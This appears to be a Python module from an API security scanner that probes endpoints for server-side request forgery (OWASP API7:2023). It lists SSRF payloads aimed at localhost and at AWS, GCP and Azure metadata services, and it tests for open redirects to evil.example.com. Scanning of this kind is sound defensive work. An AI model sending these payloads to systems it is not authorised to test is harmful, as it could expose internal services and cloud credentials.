"""
API7:2023 - Server Side Request Forgery (SSRF)
Tests whether API endpoints that accept URLs as input can be abused
to make the server send requests to internal/cloud metadata services.
"""
from .base import BaseScanner, ScanConfig
from typing import Dict, Any, List
import asyncio


class SSRFScanner(BaseScanner):
    VULN_ID = "API7"
    VULN_NAME = "Server Side Request Forgery (SSRF)"
    CVSS_VECTOR = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N"

    # Endpoints that commonly accept URL parameters
    URL_PARAM_PATHS = [
        ("/api/v1/fetch", "url"),
        ("/api/fetch", "url"),
        ("/api/v1/import", "url"),
        ("/api/import", "source_url"),
        ("/api/v1/webhook", "callback_url"),
        ("/api/webhook", "url"),
        ("/api/v1/preview", "url"),
        ("/api/preview", "target"),
        ("/api/v1/proxy", "url"),
        ("/api/export", "destination"),
    ]

    # SSRF payloads targeting internal services and cloud metadata
    SSRF_PAYLOADS = [
        "http://localhost:80",
        "http://127.0.0.1:22",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/",           # GCP metadata
        "http://169.254.169.254/metadata/v1/",        # Azure metadata
        "http://0.0.0.0:80",
        "http://[::1]:80",
    ]

    # URL parameter names to test in query strings
    QUERY_PARAMS = ["url", "uri", "path", "dest", "redirect", "next", "target", "src", "source", "callback"]

    async def _test_url_param_endpoint(self, path: str, param: str) -> List[Dict]:
        findings = []
        base_url = self.config.target_url + path

        for payload in self.SSRF_PAYLOADS[:3]:
            # Test via JSON body
            resp_json = await self.request("POST", base_url, json={param: payload, "data": "test"})
            if resp_json and resp_json.status_code in [200, 201]:
                body = resp_json.text.lower()
                # Check for signs of SSRF success
                if any(indicator in body for indicator in ["ami-id", "instance-id", "hostname", "localhost", "127"]):
                    findings.append({
                        "type": "ssrf_via_json",
                        "url": base_url,
                        "parameter": param,
                        "payload": payload,
                        "detail": f"Possible SSRF: Server appears to have fetched internal URL '{payload}'",
                    })

            # Test via query parameter
            url_with_param = f"{base_url}?{param}={payload}"
            resp_get = await self.request("GET", url_with_param)
            if resp_get and resp_get.status_code in [200, 201]:
                body = resp_get.text.lower()
                if any(indicator in body for indicator in ["ami-id", "instance-id", "root:x:0"]):
                    findings.append({
                        "type": "ssrf_via_query",
                        "url": url_with_param,
                        "parameter": param,
                        "payload": payload,
                        "detail": f"SSRF via query param: Server fetched '{payload}'",
                    })

        return findings

    async def _test_open_redirect_ssrf(self) -> List[Dict]:
        """Test for open redirect that can chain to SSRF."""
        findings = []
        for param in self.QUERY_PARAMS[:5]:
            for path in ["/api/redirect", "/api/v1/redirect", "/redirect"]:
                url = f"{self.config.target_url}{path}?{param}=http://evil.example.com"
                resp = await self.request("GET", url)
                if resp and resp.status_code in [301, 302, 307, 308]:
                    loc = resp.headers.get("location", "")
                    if "evil.example.com" in loc:
                        findings.append({
                            "type": "open_redirect",
                            "url": url,
                            "redirect_to": loc,
                            "detail": "Open redirect detected — can chain to SSRF",
                        })
        return findings

    async def scan(self) -> Dict[str, Any]:
        all_findings: List[Dict] = []

        tasks = [self._test_url_param_endpoint(p, param) for p, param in self.URL_PARAM_PATHS]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, list):
                all_findings.extend(r)

        redirect_findings = await self._test_open_redirect_ssrf()
        all_findings.extend(redirect_findings)

        found = len(all_findings) > 0
        evidence = {
            "ssrf_findings": all_findings,
            "payloads_tested": self.SSRF_PAYLOADS[:3],
            "endpoints_tested": len(self.URL_PARAM_PATHS),
            "test_description": (
                "Injected internal/cloud metadata URLs (localhost, 127.0.0.1, AWS/GCP metadata) "
                "into URL-accepting API parameters. Also tested for open redirects that can chain to SSRF."
            ),
        }
        return self.base_finding(found, evidence)
